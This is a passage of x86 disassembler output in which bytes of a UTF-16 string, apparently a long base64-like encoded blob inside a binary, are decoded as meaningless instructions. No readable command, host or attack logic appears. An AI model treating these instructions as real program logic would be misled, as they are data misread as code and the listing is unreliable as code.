  4051b3:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  4051b6:	00 6b 00             	add    %ch,0x0(%ebx)
  4051b9:	34 00                	xor    $0x0,%al
  4051bb:	43                   	inc    %ebx
  4051bc:	00 45 00             	add    %al,0x0(%ebp)
  4051bf:	6c                   	insb   (%dx),%es:(%edi)
  4051c0:	00 48 00             	add    %cl,0x0(%eax)
  4051c3:	6d                   	insl   (%dx),%es:(%edi)
  4051c4:	00 31                	add    %dh,(%ecx)
  4051c6:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  4051ca:	00 31                	add    %dh,(%ecx)
  4051cc:	00 59 00             	add    %bl,0x0(%ecx)
  4051cf:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4051d3:	45                   	inc    %ebp
  4051d4:	00 42 00             	add    %al,0x0(%edx)
  4051d7:	72 00                	jb     0x4051d9
  4051d9:	50                   	push   %eax
  4051da:	00 33                	add    %dh,(%ebx)
  4051dc:	00 58 00             	add    %bl,0x0(%eax)
  4051df:	41                   	inc    %ecx
  4051e0:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4051e4:	00 6b 00             	add    %ch,0x0(%ebx)
  4051e7:	70 00                	jo     0x4051e9
  4051e9:	41                   	inc    %ecx
  4051ea:	00 4d 00             	add    %cl,0x0(%ebp)
  4051ed:	6a 00                	push   $0x0
  4051ef:	71 00                	jno    0x4051f1
  4051f1:	54                   	push   %esp
  4051f2:	00 76 00             	add    %dh,0x0(%esi)
  4051f5:	74 00                	je     0x4051f7
  4051f7:	34 00                	xor    $0x0,%al
  4051f9:	53                   	push   %ebx
  4051fa:	00 66 00             	add    %ah,0x0(%esi)
  4051fd:	55                   	push   %ebp
  4051fe:	00 51 00             	add    %dl,0x0(%ecx)
  405201:	49                   	dec    %ecx
  405202:	00 4a 00             	add    %cl,0x0(%edx)
  405205:	4e                   	dec    %esi
  405206:	00 66 00             	add    %ah,0x0(%esi)
  405209:	39 00                	cmp    %eax,(%eax)
  40520b:	72 00                	jb     0x40520d
  40520d:	43                   	inc    %ebx
  40520e:	00 65 00             	add    %ah,0x0(%ebp)
  405211:	36 00 32             	add    %dh,%ss:(%edx)
  405214:	00 56 00             	add    %dl,0x0(%esi)
  405217:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40521a:	00 67 00             	add    %ah,0x0(%edi)
  40521d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  405221:	6a 00                	push   $0x0
  405223:	64 00 33             	add    %dh,%fs:(%ebx)
  405226:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40522a:	00 6f 00             	add    %ch,0x0(%edi)
  40522d:	71 00                	jno    0x40522f
  40522f:	43                   	inc    %ebx
  405230:	00 2b                	add    %ch,(%ebx)
  405232:	00 49 00             	add    %cl,0x0(%ecx)
  405235:	45                   	inc    %ebp
  405236:	00 65 00             	add    %ah,0x0(%ebp)
  405239:	35 00 44 00 32       	xor    $0x32004400,%eax
  40523e:	00 71 00             	add    %dh,0x0(%ecx)
  405241:	78 00                	js     0x405243
  405243:	6e                   	outsb  %ds:(%esi),(%dx)
  405244:	00 69 00             	add    %ch,0x0(%ecx)
  405247:	70 00                	jo     0x405249
  405249:	55                   	push   %ebp
  40524a:	00 32                	add    %dh,(%edx)
  40524c:	00 71 00             	add    %dh,0x0(%ecx)
  40524f:	4c                   	dec    %esp
  405250:	00 47 00             	add    %al,0x0(%edi)
  405253:	6a 00                	push   $0x0
  405255:	73 00                	jae    0x405257
  405257:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40525b:	4f                   	dec    %edi
  40525c:	00 39                	add    %bh,(%ecx)
  40525e:	00 32                	add    %dh,(%edx)
  405260:	00 2b                	add    %ch,(%ebx)
  405262:	00 45 00             	add    %al,0x0(%ebp)
  405265:	6a 00                	push   $0x0
  405267:	62 00                	bound  %eax,(%eax)
  405269:	34 00                	xor    $0x0,%al
  40526b:	37                   	aaa
  40526c:	00 59 00             	add    %bl,0x0(%ecx)
  40526f:	53                   	push   %ebx
  405270:	00 48 00             	add    %cl,0x0(%eax)
  405273:	4e                   	dec    %esi
  405274:	00 39                	add    %bh,(%ecx)
  405276:	00 41 00             	add    %al,0x0(%ecx)
  405279:	6a 00                	push   $0x0
  40527b:	76 00                	jbe    0x40527d
  40527d:	52                   	push   %edx
  40527e:	00 52 00             	add    %dl,0x0(%edx)
  405281:	48                   	dec    %eax
  405282:	00 6e 00             	add    %ch,0x0(%esi)
  405285:	4f                   	dec    %edi
  405286:	00 58 00             	add    %bl,0x0(%eax)
  405289:	56                   	push   %esi
  40528a:	00 62 00             	add    %ah,0x0(%edx)
  40528d:	68 00 6d 00 78       	push   $0x78006d00
  405292:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  405296:	00 73 00             	add    %dh,0x0(%ebx)
  405299:	37                   	aaa
  40529a:	00 61 00             	add    %ah,0x0(%ecx)
  40529d:	38 00                	cmp    %al,(%eax)
  40529f:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  4052a3:	49                   	dec    %ecx
  4052a4:	00 72 00             	add    %dh,0x0(%edx)
  4052a7:	54                   	push   %esp
  4052a8:	00 52 00             	add    %dl,0x0(%edx)
  4052ab:	70 00                	jo     0x4052ad
  4052ad:	32 00                	xor    (%eax),%al
  4052af:	73 00                	jae    0x4052b1
  4052b1:	54                   	push   %esp
  4052b2:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  4052b6:	00 56 00             	add    %dl,0x0(%esi)
  4052b9:	48                   	dec    %eax
  4052ba:	00 62 00             	add    %ah,0x0(%edx)
  4052bd:	71 00                	jno    0x4052bf
  4052bf:	33 00                	xor    (%eax),%eax
  4052c1:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  4052c5:	4b                   	dec    %ebx
  4052c6:	00 49 00             	add    %cl,0x0(%ecx)
  4052c9:	31 00                	xor    %eax,(%eax)
  4052cb:	5a                   	pop    %edx
  4052cc:	00 30                	add    %dh,(%eax)
  4052ce:	00 6d 00             	add    %ch,0x0(%ebp)
  4052d1:	36 00 30             	add    %dh,%ss:(%eax)
  4052d4:	00 33                	add    %dh,(%ebx)
  4052d6:	00 68 00             	add    %ch,0x0(%eax)
  4052d9:	66 00 57 00          	data16 add %dl,0x0(%edi)
  4052dd:	54                   	push   %esp
  4052de:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  4052e2:	00 46 00             	add    %al,0x0(%esi)
  4052e5:	4e                   	dec    %esi
  4052e6:	00 77 00             	add    %dh,0x0(%edi)
  4052e9:	2b 00                	sub    (%eax),%eax
  4052eb:	76 00                	jbe    0x4052ed
  4052ed:	7a 00                	jp     0x4052ef
  4052ef:	32 00                	xor    (%eax),%al
  4052f1:	35 00 6c 00 45       	xor    $0x45006c00,%eax
  4052f6:	00 55 00             	add    %dl,0x0(%ebp)
  4052f9:	37                   	aaa
  4052fa:	00 34 00             	add    %dh,(%eax,%eax,1)
  4052fd:	4b                   	dec    %ebx
  4052fe:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  405302:	00 4e 00             	add    %cl,0x0(%esi)
  405305:	61                   	popa
  405306:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40530a:	00 2f                	add    %ch,(%edi)
  40530c:	00 59 00             	add    %bl,0x0(%ecx)
  40530f:	51                   	push   %ecx
  405310:	00 76 00             	add    %dh,0x0(%esi)
  405313:	68 00 74 00 71       	push   $0x71007400
  405318:	00 52 00             	add    %dl,0x0(%edx)
  40531b:	68 00 37 00 70       	push   $0x70003700
  405320:	00 32                	add    %dh,(%edx)
  405322:	00 6f 00             	add    %ch,0x0(%edi)
  405325:	41                   	inc    %ecx
  405326:	00 39                	add    %bh,(%ecx)
  405328:	00 56 00             	add    %dl,0x0(%esi)
  40532b:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40532f:	6d                   	insl   (%dx),%es:(%edi)
  405330:	00 34 00             	add    %dh,(%eax,%eax,1)
  405333:	50                   	push   %eax
  405334:	00 34 00             	add    %dh,(%eax,%eax,1)
  405337:	38 00                	cmp    %al,(%eax)
  405339:	7a 00                	jp     0x40533b
  40533b:	4f                   	dec    %edi
  40533c:	00 33                	add    %dh,(%ebx)
  40533e:	00 76 00             	add    %dh,0x0(%esi)
  405341:	46                   	inc    %esi
  405342:	00 36                	add    %dh,(%esi)
  405344:	00 4a 00             	add    %cl,0x0(%edx)
  405347:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40534b:	59                   	pop    %ecx
  40534c:	00 52 00             	add    %dl,0x0(%edx)
  40534f:	41                   	inc    %ecx
  405350:	00 4e 00             	add    %cl,0x0(%esi)
  405353:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  405357:	6f                   	outsl  %ds:(%esi),(%dx)
  405358:	00 36                	add    %dh,(%esi)
  40535a:	00 48 00             	add    %cl,0x0(%eax)
  40535d:	42                   	inc    %edx
  40535e:	00 66 00             	add    %ah,0x0(%esi)
  405361:	38 00                	cmp    %al,(%eax)
  405363:	63 00                	arpl   %eax,(%eax)
  405365:	39 00                	cmp    %eax,(%eax)
  405367:	30 00                	xor    %al,(%eax)
  405369:	55                   	push   %ebp
  40536a:	00 69 00             	add    %ch,0x0(%ecx)
  40536d:	34 00                	xor    $0x0,%al
  40536f:	66 00 67 00          	data16 add %ah,0x0(%edi)
  405373:	52                   	push   %edx
  405374:	00 57 00             	add    %dl,0x0(%edi)
  405377:	48                   	dec    %eax
  405378:	00 6d 00             	add    %ch,0x0(%ebp)
  40537b:	53                   	push   %ebx
  40537c:	00 56 00             	add    %dl,0x0(%esi)
  40537f:	4d                   	dec    %ebp
  405380:	00 6f 00             	add    %ch,0x0(%edi)
  405383:	58                   	pop    %eax
  405384:	00 2f                	add    %ch,(%edi)
  405386:	00 55 00             	add    %dl,0x0(%ebp)
  405389:	57                   	push   %edi
  40538a:	00 53 00             	add    %dl,0x0(%ebx)
  40538d:	51                   	push   %ecx
  40538e:	00 6d 00             	add    %ch,0x0(%ebp)
  405391:	45                   	inc    %ebp
  405392:	00 39                	add    %bh,(%ecx)
  405394:	00 61 00             	add    %ah,0x0(%ecx)
  405397:	2f                   	das
  405398:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40539c:	00 58 00             	add    %bl,0x0(%eax)
  40539f:	63 00                	arpl   %eax,(%eax)
  4053a1:	70 00                	jo     0x4053a3
  4053a3:	78 00                	js     0x4053a5
  4053a5:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  4053a9:	62 00                	bound  %eax,(%eax)
  4053ab:	38 00                	cmp    %al,(%eax)
  4053ad:	30 00                	xor    %al,(%eax)
  4053af:	53                   	push   %ebx
  4053b0:	00 65 00             	add    %ah,0x0(%ebp)
  4053b3:	46                   	inc    %esi
  4053b4:	00 46 00             	add    %al,0x0(%esi)
  4053b7:	71 00                	jno    0x4053b9
  4053b9:	35 00 66 00 4b       	xor    $0x4b006600,%eax
  4053be:	00 34 00             	add    %dh,(%eax,%eax,1)
  4053c1:	41                   	inc    %ecx
  4053c2:	00 72 00             	add    %dh,0x0(%edx)
  4053c5:	70 00                	jo     0x4053c7
  4053c7:	53                   	push   %ebx
  4053c8:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  4053cc:	00 65 00             	add    %ah,0x0(%ebp)
  4053cf:	52                   	push   %edx
  4053d0:	00 4e 00             	add    %cl,0x0(%esi)
  4053d3:	63 00                	arpl   %eax,(%eax)
  4053d5:	57                   	push   %edi
  4053d6:	00 48 00             	add    %cl,0x0(%eax)
  4053d9:	33 00                	xor    (%eax),%eax
  4053db:	6b 00 68             	imul   $0x68,(%eax),%eax
  4053de:	00 73 00             	add    %dh,0x0(%ebx)
  4053e1:	7a 00                	jp     0x4053e3
  4053e3:	78 00                	js     0x4053e5
  4053e5:	35 00 47 00 36       	xor    $0x36004700,%eax
  4053ea:	00 35 00 59 00 45    	add    %dh,0x45005900
  4053f0:	00 57 00             	add    %dl,0x0(%edi)
  4053f3:	41                   	inc    %ecx
  4053f4:	00 78 00             	add    %bh,0x0(%eax)
  4053f7:	46                   	inc    %esi
  4053f8:	00 71 00             	add    %dh,0x0(%ecx)
  4053fb:	52                   	push   %edx
  4053fc:	00 34 00             	add    %dh,(%eax,%eax,1)
  4053ff:	39 00                	cmp    %eax,(%eax)
  405401:	71 00                	jno    0x405403
  405403:	38 00                	cmp    %al,(%eax)
  405405:	53                   	push   %ebx
  405406:	00 6d 00             	add    %ch,0x0(%ebp)
  405409:	34 00                	xor    $0x0,%al
  40540b:	78 00                	js     0x40540d
  40540d:	72 00                	jb     0x40540f
  40540f:	72 00                	jb     0x405411
  405411:	72 00                	jb     0x405413
  405413:	70 00                	jo     0x405415
  405415:	78 00                	js     0x405417
  405417:	4c                   	dec    %esp
  405418:	00 51 00             	add    %dl,0x0(%ecx)
  40541b:	76 00                	jbe    0x40541d
  40541d:	76 00                	jbe    0x40541f
  40541f:	57                   	push   %edi
  405420:	00 52 00             	add    %dl,0x0(%edx)
  405423:	4e                   	dec    %esi
  405424:	00 7a 00             	add    %bh,0x0(%edx)
  405427:	78 00                	js     0x405429
  405429:	2b 00                	sub    (%eax),%eax
  40542b:	58                   	pop    %eax
  40542c:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  405430:	00 6b 00             	add    %ch,0x0(%ebx)
  405433:	35 00 74 00 4e       	xor    $0x4e007400,%eax
  405438:	00 7a 00             	add    %bh,0x0(%edx)
  40543b:	5a                   	pop    %edx
  40543c:	00 37                	add    %dh,(%edi)
  40543e:	00 32                	add    %dh,(%edx)
  405440:	00 33                	add    %dh,(%ebx)
  405442:	00 5a 00             	add    %bl,0x0(%edx)
  405445:	4c                   	dec    %esp
  405446:	00 4b 00             	add    %cl,0x0(%ebx)
  405449:	31 00                	xor    %eax,(%eax)
  40544b:	48                   	dec    %eax
  40544c:	00 5a 00             	add    %bl,0x0(%edx)
  40544f:	2f                   	das
  405450:	00 67 00             	add    %ah,0x0(%edi)
  405453:	5a                   	pop    %edx
  405454:	00 75 00             	add    %dh,0x0(%ebp)
  405457:	69 00 4b 00 49 00    	imul   $0x49004b,(%eax),%eax
  40545d:	6a 00                	push   $0x0
  40545f:	4a                   	dec    %edx
  405460:	00 6b 00             	add    %ch,0x0(%ebx)
  405463:	39 00                	cmp    %eax,(%eax)
  405465:	73 00                	jae    0x405467
  405467:	4e                   	dec    %esi
  405468:	00 30                	add    %dh,(%eax)
  40546a:	00 43 00             	add    %al,0x0(%ebx)
  40546d:	38 00                	cmp    %al,(%eax)
  40546f:	4b                   	dec    %ebx
  405470:	00 6e 00             	add    %ch,0x0(%esi)
  405473:	53                   	push   %ebx
  405474:	00 55 00             	add    %dl,0x0(%ebp)
  405477:	73 00                	jae    0x405479
  405479:	56                   	push   %esi
  40547a:	00 55 00             	add    %dl,0x0(%ebp)
  40547d:	66 00 78 00          	data16 add %bh,0x0(%eax)
  405481:	53                   	push   %ebx
  405482:	00 45 00             	add    %al,0x0(%ebp)
  405485:	39 00                	cmp    %eax,(%eax)
  405487:	49                   	dec    %ecx
  405488:	00 37                	add    %dh,(%edi)
  40548a:	00 56 00             	add    %dl,0x0(%esi)
  40548d:	78 00                	js     0x40548f
  40548f:	41                   	inc    %ecx
  405490:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  405494:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  405498:	00 39                	add    %bh,(%ecx)
  40549a:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40549e:	00 55 00             	add    %dl,0x0(%ebp)
  4054a1:	6a 00                	push   $0x0
  4054a3:	74 00                	je     0x4054a5
  4054a5:	5a                   	pop    %edx
  4054a6:	00 39                	add    %bh,(%ecx)
  4054a8:	00 77 00             	add    %dh,0x0(%edi)
  4054ab:	45                   	inc    %ebp
  4054ac:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  4054b0:	00 5a 00             	add    %bl,0x0(%edx)
  4054b3:	73 00                	jae    0x4054b5
  4054b5:	4e                   	dec    %esi
  4054b6:	00 67 00             	add    %ah,0x0(%edi)
  4054b9:	37                   	aaa
  4054ba:	00 48 00             	add    %cl,0x0(%eax)
  4054bd:	62 00                	bound  %eax,(%eax)
  4054bf:	76 00                	jbe    0x4054c1
  4054c1:	73 00                	jae    0x4054c3
  4054c3:	47                   	inc    %edi
  4054c4:	00 55 00             	add    %dl,0x0(%ebp)
  4054c7:	58                   	pop    %eax
  4054c8:	00 39                	add    %bh,(%ecx)
  4054ca:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  4054ce:	00 37                	add    %dh,(%edi)
  4054d0:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  4054d4:	00 46 00             	add    %al,0x0(%esi)
  4054d7:	57                   	push   %edi
  4054d8:	00 70 00             	add    %dh,0x0(%eax)
  4054db:	52                   	push   %edx
  4054dc:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  4054e0:	00 6d 00             	add    %ch,0x0(%ebp)
  4054e3:	63 00                	arpl   %eax,(%eax)
  4054e5:	6d                   	insl   (%dx),%es:(%edi)
  4054e6:	00 63 00             	add    %ah,0x0(%ebx)
  4054e9:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  4054ed:	34 00                	xor    $0x0,%al
  4054ef:	59                   	pop    %ecx
  4054f0:	00 4b 00             	add    %cl,0x0(%ebx)
  4054f3:	52                   	push   %edx
  4054f4:	00 48 00             	add    %cl,0x0(%eax)
  4054f7:	4c                   	dec    %esp
  4054f8:	00 59 00             	add    %bl,0x0(%ecx)
  4054fb:	4c                   	dec    %esp
  4054fc:	00 63 00             	add    %ah,0x0(%ebx)
  4054ff:	4e                   	dec    %esi
  405500:	00 77 00             	add    %dh,0x0(%edi)
  405503:	71 00                	jno    0x405505
  405505:	31 00                	xor    %eax,(%eax)
  405507:	57                   	push   %edi
  405508:	00 37                	add    %dh,(%edi)
  40550a:	00 2f                	add    %ch,(%edi)
  40550c:	00 38                	add    %bh,(%eax)
  40550e:	00 34 00             	add    %dh,(%eax,%eax,1)
  405511:	5a                   	pop    %edx
  405512:	00 71 00             	add    %dh,0x0(%ecx)
  405515:	7a 00                	jp     0x405517
  405517:	5a                   	pop    %edx
  405518:	00 4e 00             	add    %cl,0x0(%esi)
  40551b:	61                   	popa
  40551c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40551f:	6e                   	outsb  %ds:(%esi),(%dx)
  405520:	00 4a 00             	add    %cl,0x0(%edx)
  405523:	42                   	inc    %edx
  405524:	00 57 00             	add    %dl,0x0(%edi)
  405527:	5a                   	pop    %edx
  405528:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40552c:	00 70 00             	add    %dh,0x0(%eax)
  40552f:	61                   	popa
  405530:	00 75 00             	add    %dh,0x0(%ebp)
  405533:	55                   	push   %ebp
  405534:	00 2b                	add    %ch,(%ebx)
  405536:	00 48 00             	add    %cl,0x0(%eax)
  405539:	2f                   	das
  40553a:	00 52 00             	add    %dl,0x0(%edx)
  40553d:	75 00                	jne    0x40553f
  40553f:	30 00                	xor    %al,(%eax)
  405541:	6e                   	outsb  %ds:(%esi),(%dx)
  405542:	00 42 00             	add    %al,0x0(%edx)
  405545:	39 00                	cmp    %eax,(%eax)
  405547:	75 00                	jne    0x405549
  405549:	78 00                	js     0x40554b
  40554b:	2b 00                	sub    (%eax),%eax
  40554d:	50                   	push   %eax
  40554e:	00 62 00             	add    %ah,0x0(%edx)
  405551:	47                   	inc    %edi
  405552:	00 61 00             	add    %ah,0x0(%ecx)
  405555:	74 00                	je     0x405557
  405557:	67 00 32             	add    %dh,(%bp,%si)
  40555a:	00 50 00             	add    %dl,0x0(%eax)
  40555d:	61                   	popa
  40555e:	00 47 00             	add    %al,0x0(%edi)
  405561:	74 00                	je     0x405563
  405563:	35 00 6b 00 52       	xor    $0x52006b00,%eax
  405568:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  40556c:	00 51 00             	add    %dl,0x0(%ecx)
  40556f:	38 00                	cmp    %al,(%eax)
  405571:	36 00 37             	add    %dh,%ss:(%edi)
  405574:	00 47 00             	add    %al,0x0(%edi)
  405577:	67 00 31             	add    %dh,(%bx,%di)
  40557a:	00 4a 00             	add    %cl,0x0(%edx)
  40557d:	2b 00                	sub    (%eax),%eax
  40557f:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  405583:	33 00                	xor    (%eax),%eax
  405585:	4d                   	dec    %ebp
  405586:	00 32                	add    %dh,(%edx)
  405588:	00 4a 00             	add    %cl,0x0(%edx)
  40558b:	59                   	pop    %ecx
  40558c:	00 55 00             	add    %dl,0x0(%ebp)
  40558f:	57                   	push   %edi
  405590:	00 53 00             	add    %dl,0x0(%ebx)
  405593:	42                   	inc    %edx
  405594:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  405598:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40559c:	00 58 00             	add    %bl,0x0(%eax)
  40559f:	44                   	inc    %esp
  4055a0:	00 58 00             	add    %bl,0x0(%eax)
  4055a3:	73 00                	jae    0x4055a5
  4055a5:	77 00                	ja     0x4055a7
  4055a7:	62 00                	bound  %eax,(%eax)
  4055a9:	58                   	pop    %eax
  4055aa:	00 45 00             	add    %al,0x0(%ebp)
  4055ad:	66 00 76 00          	data16 add %dh,0x0(%esi)
  4055b1:	38 00                	cmp    %al,(%eax)
  4055b3:	47                   	inc    %edi
  4055b4:	00 5a 00             	add    %bl,0x0(%edx)
  4055b7:	32 00                	xor    (%eax),%al
  4055b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4055ba:	00 4a 00             	add    %cl,0x0(%edx)
  4055bd:	62 00                	bound  %eax,(%eax)
  4055bf:	2b 00                	sub    (%eax),%eax
  4055c1:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  4055c5:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  4055c8:	00 4b 00             	add    %cl,0x0(%ebx)
  4055cb:	79 00                	jns    0x4055cd
  4055cd:	72 00                	jb     0x4055cf
  4055cf:	39 00                	cmp    %eax,(%eax)
  4055d1:	72 00                	jb     0x4055d3
  4055d3:	6c                   	insb   (%dx),%es:(%edi)
  4055d4:	00 46 00             	add    %al,0x0(%esi)
  4055d7:	6c                   	insb   (%dx),%es:(%edi)
  4055d8:	00 50 00             	add    %dl,0x0(%eax)
  4055db:	51                   	push   %ecx
  4055dc:	00 4f 00             	add    %cl,0x0(%edi)
  4055df:	39 00                	cmp    %eax,(%eax)
  4055e1:	43                   	inc    %ebx
  4055e2:	00 70 00             	add    %dh,0x0(%eax)
  4055e5:	5a                   	pop    %edx
  4055e6:	00 32                	add    %dh,(%edx)
  4055e8:	00 77 00             	add    %dh,0x0(%edi)
  4055eb:	66 00 52 00          	data16 add %dl,0x0(%edx)
  4055ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f0:	00 4b 00             	add    %cl,0x0(%ebx)
  4055f3:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  4055f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f8:	00 45 00             	add    %al,0x0(%ebp)
  4055fb:	69 00 46 00 4d 00    	imul   $0x4d0046,(%eax),%eax
  405601:	45                   	inc    %ebp
  405602:	00 58 00             	add    %bl,0x0(%eax)
  405605:	50                   	push   %eax
  405606:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40560a:	00 6a 00             	add    %ch,0x0(%edx)
  40560d:	7a 00                	jp     0x40560f
  40560f:	48                   	dec    %eax
  405610:	00 6e 00             	add    %ch,0x0(%esi)
  405613:	70 00                	jo     0x405615
  405615:	6e                   	outsb  %ds:(%esi),(%dx)
  405616:	00 34 00             	add    %dh,(%eax,%eax,1)
  405619:	63 00                	arpl   %eax,(%eax)
  40561b:	30 00                	xor    %al,(%eax)
  40561d:	53                   	push   %ebx
  40561e:	00 6a 00             	add    %ch,0x0(%edx)
  405621:	38 00                	cmp    %al,(%eax)
  405623:	6e                   	outsb  %ds:(%esi),(%dx)
  405624:	00 78 00             	add    %bh,0x0(%eax)
  405627:	55                   	push   %ebp
  405628:	00 71 00             	add    %dh,0x0(%ecx)
  40562b:	4b                   	dec    %ebx
  40562c:	00 50 00             	add    %dl,0x0(%eax)
  40562f:	59                   	pop    %ecx
  405630:	00 72 00             	add    %dh,0x0(%edx)
  405633:	69 00 44 00 2f 00    	imul   $0x2f0044,(%eax),%eax
  405639:	33 00                	xor    (%eax),%eax
  40563b:	67 00 46 00          	add    %al,0x0(%bp)
  40563f:	57                   	push   %edi
  405640:	00 73 00             	add    %dh,0x0(%ebx)
  405643:	39 00                	cmp    %eax,(%eax)
  405645:	4d                   	dec    %ebp
  405646:	00 55 00             	add    %dl,0x0(%ebp)
  405649:	6b 00 34             	imul   $0x34,(%eax),%eax
  40564c:	00 6a 00             	add    %ch,0x0(%edx)
  40564f:	50                   	push   %eax
  405650:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  405654:	00 41 00             	add    %al,0x0(%ecx)
  405657:	74 00                	je     0x405659
  405659:	73 00                	jae    0x40565b
  40565b:	7a 00                	jp     0x40565d
  40565d:	59                   	pop    %ecx
  40565e:	00 51 00             	add    %dl,0x0(%ecx)
  405661:	52                   	push   %edx
  405662:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  405666:	00 33                	add    %dh,(%ebx)
  405668:	00 4a 00             	add    %cl,0x0(%edx)
  40566b:	4c                   	dec    %esp
  40566c:	00 77 00             	add    %dh,0x0(%edi)
  40566f:	32 00                	xor    (%eax),%al
  405671:	57                   	push   %edi
  405672:	00 50 00             	add    %dl,0x0(%eax)
  405675:	33 00                	xor    (%eax),%eax
  405677:	6c                   	insb   (%dx),%es:(%edi)
  405678:	00 50 00             	add    %dl,0x0(%eax)
  40567b:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40567f:	55                   	push   %ebp
  405680:	00 62 00             	add    %ah,0x0(%edx)
  405683:	42                   	inc    %edx
  405684:	00 56 00             	add    %dl,0x0(%esi)
  405687:	75 00                	jne    0x405689
  405689:	65 00 36             	add    %dh,%gs:(%esi)
  40568c:	00 4b 00             	add    %cl,0x0(%ebx)
  40568f:	4e                   	dec    %esi
  405690:	00 71 00             	add    %dh,0x0(%ecx)
  405693:	31 00                	xor    %eax,(%eax)
  405695:	4f                   	dec    %edi
  405696:	00 6d 00             	add    %ch,0x0(%ebp)
  405699:	4f                   	dec    %edi
  40569a:	00 6d 00             	add    %ch,0x0(%ebp)
  40569d:	43                   	inc    %ebx
  40569e:	00 68 00             	add    %ch,0x0(%eax)
  4056a1:	50                   	push   %eax
  4056a2:	00 6e 00             	add    %ch,0x0(%esi)
  4056a5:	35 00 31 00 50       	xor    $0x50003100,%eax
  4056aa:	00 79 00             	add    %bh,0x0(%ecx)
  4056ad:	41                   	inc    %ecx
  4056ae:	00 45 00             	add    %al,0x0(%ebp)
  4056b1:	4a                   	dec    %edx
  4056b2:	00 4d 00             	add    %cl,0x0(%ebp)
  4056b5:	4f                   	dec    %edi
  4056b6:	00 46 00             	add    %al,0x0(%esi)
  4056b9:	71 00                	jno    0x4056bb
  4056bb:	4c                   	dec    %esp
  4056bc:	00 38                	add    %bh,(%eax)
  4056be:	00 77 00             	add    %dh,0x0(%edi)
  4056c1:	77 00                	ja     0x4056c3
  4056c3:	75 00                	jne    0x4056c5
  4056c5:	56                   	push   %esi
  4056c6:	00 4d 00             	add    %cl,0x0(%ebp)
  4056c9:	6d                   	insl   (%dx),%es:(%edi)
  4056ca:	00 31                	add    %dh,(%ecx)
  4056cc:	00 71 00             	add    %dh,0x0(%ecx)
  4056cf:	70 00                	jo     0x4056d1
  4056d1:	6a 00                	push   $0x0
  4056d3:	67 00 39             	add    %bh,(%bx,%di)
  4056d6:	00 38                	add    %bh,(%eax)
  4056d8:	00 67 00             	add    %ah,0x0(%edi)
  4056db:	71 00                	jno    0x4056dd
  4056dd:	39 00                	cmp    %eax,(%eax)
  4056df:	6d                   	insl   (%dx),%es:(%edi)
  4056e0:	00 49 00             	add    %cl,0x0(%ecx)
  4056e3:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  4056e7:	48                   	dec    %eax
  4056e8:	00 35 00 4b 00 6d    	add    %dh,0x6d004b00
  4056ee:	00 4b 00             	add    %cl,0x0(%ebx)
  4056f1:	47                   	inc    %edi
  4056f2:	00 48 00             	add    %cl,0x0(%eax)
  4056f5:	70 00                	jo     0x4056f7
  4056f7:	4f                   	dec    %edi
  4056f8:	00 66 00             	add    %ah,0x0(%esi)
  4056fb:	67 00 64 00          	add    %ah,0x0(%si)
  4056ff:	51                   	push   %ecx
  405700:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  405704:	00 32                	add    %dh,(%edx)
  405706:	00 65 00             	add    %ah,0x0(%ebp)
  405709:	31 00                	xor    %eax,(%eax)
  40570b:	4a                   	dec    %edx
  40570c:	00 47 00             	add    %al,0x0(%edi)
  40570f:	39 00                	cmp    %eax,(%eax)
  405711:	4a                   	dec    %edx
  405712:	00 4d 00             	add    %cl,0x0(%ebp)
  405715:	6c                   	insb   (%dx),%es:(%edi)
  405716:	00 58 00             	add    %bl,0x0(%eax)
  405719:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40571d:	55                   	push   %ebp
  40571e:	00 58 00             	add    %bl,0x0(%eax)
  405721:	38 00                	cmp    %al,(%eax)
  405723:	57                   	push   %edi
  405724:	00 32                	add    %dh,(%edx)
  405726:	00 41 00             	add    %al,0x0(%ecx)
  405729:	43                   	inc    %ebx
  40572a:	00 55 00             	add    %dl,0x0(%ebp)
